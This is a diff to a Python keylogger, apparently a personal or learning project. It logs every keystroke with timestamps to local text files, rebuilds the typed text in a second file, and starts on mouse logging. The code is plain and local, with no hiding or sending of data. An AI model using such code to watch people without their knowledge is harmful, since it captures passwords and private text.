@@ -6,10 +6,11 @@ import sys
 #-----------------------------------------------------------------
 
 Allkeylogsfile = open("AllLoggedKeys.txt", 'a')
-keyWordslogs = open("LoggedKeyWords.txt", 'a')
-
+keyWordslogs = open("ActualDisplay.txt", 'a')
 keys = []
-word_Keys = []
+Actual = []
+keys.append("------------------------------------------------------------------\n")
+Actual.append("------------------------------------------------------------------\n")
 
 Excluded_Keys = {
     keyboard.Key.shift_l, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, 
@@ -30,30 +31,30 @@ def get_timestamp():
     return datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
 def pressed(key):
-    global keys, word_Keys
+    global keys, Actual
     timestamp = get_timestamp()
     try:
         print(f'{key.char} pressed at {timestamp}')
         keys.append(f'{timestamp} - {key.char}')
-        word_Keys.append(f'{key.char}')
+        Actual.append(f'{key.char}')
     except AttributeError:
         if key == keyboard.Key.space:
             print(f'Space key pressed at {timestamp}')
             keys.append(f'{timestamp} - <{key}>')
-            word_Keys.append(f' ')
+            Actual.append(f' ')
         elif key == keyboard.Key.enter:
             print(f'Enter key pressed at {timestamp}')
             keys.append(f'{timestamp} - <{key}>')
-            word_Keys.append(f'\n')
+            Actual.append(f'\n')
         else:
             print(f'Special key {key} pressed at {timestamp}')
             keys.append(f'{timestamp} - <{key}>')
             if key in Excluded_Keys:
                 return
-            elif key == keyboard.Key.backspace and word_Keys:
-                word_Keys.pop()
+            elif key == keyboard.Key.backspace and Actual:
+                Actual.pop()
             else:
-                word_Keys.append(f'<{key}>')
+                Actual.append(f'<{key}>')
 
 def released(key):
     timestamp = get_timestamp()
@@ -69,20 +70,22 @@ def released(key):
 
 
 def write_File():
-    global keys, word_Keys
+    global keys, Actual
     for key in keys:
         Allkeylogsfile.write(str(key))
         Allkeylogsfile.write("\n")
     keys.clear()
-    for key in word_Keys:
-        keyWordslogs.write(str(key))
-    word_Keys.clear()
+    Actual.append("\n")
+    for key in Actual:
+        keyWordslogs.write(str(key))    
+    Actual.clear()
     
 #------------------------------------------------------------
 #---------------------------------Mouse----------------------
 #------------------------------------------------------------
 
 Mouselogs = []
+Mouselogs.append("------------------------------------------------------------------\n")
 MouselogsFile = open("Mouse_Logs.txt", 'a')
 
 def move(x, y):
